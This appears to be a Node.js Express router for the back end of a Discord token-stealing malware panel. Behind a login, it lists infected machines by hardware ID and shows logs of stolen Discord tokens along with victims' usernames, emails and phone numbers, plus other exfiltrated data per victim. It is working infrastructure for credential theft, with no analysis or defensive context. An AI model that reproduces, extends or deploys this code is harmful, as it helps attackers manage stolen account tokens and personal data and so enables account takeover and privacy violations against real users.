const express = require('express');
const moment = require('moment');
const passport = require('passport');

module.exports = (app) => {
    const router = express.Router();

    router.use((req, res, next) => {
        if (req.path != '/login') {
            if (req.isAuthenticated()) {
                return next();
            }

            return res.redirect('login');
        }

        return next();
    });

    //router.post('/login', passport.authenticate('local', { successRedirect: 'clients', failureRedirect: 'login?err=1' }));

    router.post('/login', (req, res, next) => {
        passport.authenticate('local', (err, user, info) => {
            if (err) {
                return next(err);
            }

            if (!user) {
                return res.redirect('login?err=1');
            }

            req.logIn(user, (err) => {
                if (err) {
                    return next(err);
                }

                return res.redirect('clients');
            });
        })(req, res, next);
    });

    router.get('/login', (req, res) => {
        res.render('login', { fail: req.query.err != undefined });
    });

    router.get('/clients', (req, res) => {
        res.render('clients');
    });

    router.get('/clients/:hwid/discord', (req, res) => {
        const data = app.db.prepare('SELECT * FROM token_logs WHERE hwid = ? ORDER BY `id` DESC').all(req.params.hwid);

        let tableData = [];

        data.forEach((entry) => {
            const tokens = JSON.parse(entry.tokens);

            tokens.forEach((token) => {
                const parsedToken = JSON.parse(token);

                tableData.push({
                    id: entry.id,
                    date: moment(entry.date).utcOffset('-0400').format('MM-DD-YYYY HH:mm A'),
                    user: `${parsedToken.username}#${parsedToken.discriminator}`,
                    email: parsedToken.email,
                    phone: parsedToken.phone.replace(' ', '+'),
                    token: parsedToken.token,
                });
            });
        });

        res.render('clientDiscordLogs', { hwid: req.params.hwid, tableData });
    });

    router.get('/clients/:hwid/data', (req, res) => {
        const data = app.db.prepare('SELECT * FROM data_logs WHERE hwid = ? ORDER BY `id` DESC').all(req.params.hwid);

        let tableData = [];

        data.forEach((entry) => {
            tableData.push({
                id: entry.id,
                date: moment(entry.date).utcOffset('-0400').format('MM-DD-YYYY HH:mm A'),
                data: entry.data,
            });
        });

        res.render('clientDataLogs', { hwid: req.params.hwid, tableData });
    });

    router.get('/clients/:hwid', (req, res) => {
        res.render('clientInfo', { hwid: req.params.hwid });
    });

    return router;
};
